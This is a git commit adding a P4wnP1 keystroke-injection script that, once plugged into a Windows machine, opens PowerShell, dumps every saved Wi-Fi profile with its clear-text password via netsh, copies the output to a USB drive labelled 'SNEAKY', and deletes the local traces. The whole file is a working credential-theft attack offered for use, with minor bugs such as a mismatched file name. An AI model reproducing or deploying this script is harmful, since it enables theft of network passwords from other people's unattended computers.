08b7189eb52d24a0cabaafe4ae654aa20471fffa
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-04-22 14:18:39 -0600

    Create WifiKeysExtractor.js

---
+++ HID-Scripts/WifiKeysExtractor.js
@@ -0,0 +1,46 @@
+// Windows File Exfiltrator
+// Author: PingDucKY https://github.com/PingDucKY/payloads-P4wnP1-A.L.O.A
+// Edited by: Coderdude112 on GitHub 
+// This attack extracts info on saved wifi networks and their passwords
+
+layout('us');				// Set keyboard layout to US
+var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack
+
+function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
+  delay(2200);				// Delay to make sure that File Explorer doesent take focus
+  press("GUI r");			// Opens a run command
+  delay(500);
+  type("powershell\n");		// Opens powershell
+  delay(500);
+
+  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;");	// Find the drive named "SNEAKY" and save it's path
+  
+  type("netsh wlan show profiles * > wirelessinfo.txt;");										// Gets the WIFI info and stores it in a txt file
+  type("copy wirelessinfo.txt $usbpath.name;");													// Copyies wirelesspassword to the USB
+  type("del wirelessinfo.txt\n");																// Delets the copy of wirelessinfo on the host
+  
+  type("netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > wifikeys.txt;");
+  																								// The above line gets the keys to the wifi networks
+  type("copy wifikey.txt $usbpath.name;");														// Copies wifikey to the USB
+  type("del wifikeys.txt;");																	// Deletes the copy of wifikey stored on the host
+  
+  type("exit\n");  			// Closes out 
+}
+
+function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
+  while (Ready = "False") {
+    press("SCROLL");
+    result = waitLED(SCROLL,10);
+    
+    if (result.SCROLL) { 	// If this is true then the device is initalized. The loop will break and the attack will start
+      Ready = "True";
+      break;   
+    } else {				// The device is not initalized so we will press scroll lock and retry
+        press("SCROLL");
+      }
+    
+  }
+}
+
+Initalized(); 				// Check if the host has initalized us
+Attack();					// Run the attack
